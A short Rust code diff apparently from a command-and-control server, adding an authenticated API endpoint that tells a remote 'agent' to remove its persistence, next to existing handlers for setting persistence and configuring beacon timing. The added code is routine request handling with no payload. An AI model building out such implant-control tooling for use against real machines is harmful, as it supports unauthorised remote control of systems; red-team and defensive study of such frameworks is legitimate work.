@@ -347,6 +347,35 @@ pub async fn set_persistence(
     }
 }
 
+/// Remove persistence from an agent
+pub async fn remove_persistence(
+    State(state): State<Arc<ApiState>>,
+    headers: HeaderMap,
+    Path(id): Path<u64>,
+) -> Result<Json<CommandResponse>, StatusCode> {
+    // Validate token
+    if let Some(token) = extract_token(&headers) {
+        if !state.validate_token(&token).await {
+            return Err(StatusCode::UNAUTHORIZED);
+        }
+    } else {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    
+    match state.send_command(id, "__PERSIST_REMOVE__".to_string()).await {
+        Ok(_) => Ok(Json(CommandResponse {
+            success: true,
+            message: "Remove persistence command sent".to_string(),
+            agent_id: id,
+        })),
+        Err(e) => Ok(Json(CommandResponse {
+            success: false,
+            message: e,
+            agent_id: id,
+        })),
+    }
+}
+
 /// Configure beacon timing
 pub async fn configure_beacon(
     State(state): State<Arc<ApiState>>,
